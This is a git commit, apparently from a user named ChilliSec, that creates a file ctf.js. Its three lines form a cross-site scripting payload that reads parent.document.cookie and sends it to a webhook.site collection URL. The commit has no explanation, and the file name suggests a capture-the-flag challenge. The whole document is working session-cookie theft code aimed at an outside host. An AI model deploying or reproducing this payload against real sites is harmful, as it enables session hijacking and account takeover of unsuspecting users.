58b7946ce67c1487bd60f717b64b20301a2f3cec
ChilliSec <16847981+ChilliSec@users.noreply.github.com>
2024-06-27 14:50:03 +0100

    Create ctf.js

---
+++ ctf.js
@@ -0,0 +1,3 @@
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://webhook.site/3b9d607c-2935-42bb-8021-517fd6a63882?sid=' + encodeURIComponent(parent.document.cookie), true);
+xhr.send(null);
